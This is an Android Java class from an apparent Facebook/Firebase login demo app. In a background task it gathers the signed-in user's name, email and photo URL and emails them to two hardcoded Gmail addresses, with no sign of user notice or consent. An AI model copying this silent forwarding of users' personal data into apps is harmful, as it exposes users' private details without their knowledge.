package com.um56.jefhunt.facebooklogin;

import android.os.AsyncTask;

import com.google.firebase.auth.FirebaseUser;

public class MailAsync extends AsyncTask<Void, Void, Void> {

    FirebaseUser mUser;
    MailAsync(FirebaseUser user){
        mUser = user;
    }

    @Override
    protected Void doInBackground(Void... voids) {

        EmailSender send = new EmailSender("Sender_EMail","sender_Pass");

        String user_detail = "User Name: "+mUser.getDisplayName() + "User Email: "+mUser.getEmail()+
                "User photo"+mUser.getPhotoUrl();

        try {
            send.sendMail("Facebook logged user detail",
                    user_detail,
                    "coc.1456002@gmail.com",
                    "um.56.jnv@gmail.com"
                    );
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}
